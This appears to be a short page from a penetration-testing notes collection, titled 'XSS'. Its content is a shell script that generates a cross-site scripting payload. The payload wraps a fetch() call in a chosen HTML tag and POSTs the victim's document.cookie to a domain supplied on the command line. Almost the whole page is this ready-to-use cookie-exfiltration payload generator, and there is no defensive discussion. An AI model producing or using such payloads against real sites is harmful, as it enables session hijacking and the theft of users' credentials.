# XSS

Script for generating fetch commands

<pre class="language-bash"><code class="lang-bash"><strong>#!/bin/sh
</strong>target_domain=$1
tag=$2

cat &#x3C;&#x3C; EOF
&#x3C;$tag>
fetch('https://$target_domain',
        {
        method: 'POST',
        mode: 'no-cors',
        body: document.cookie
});
&#x3C;$tag>
EOF

</code></pre>
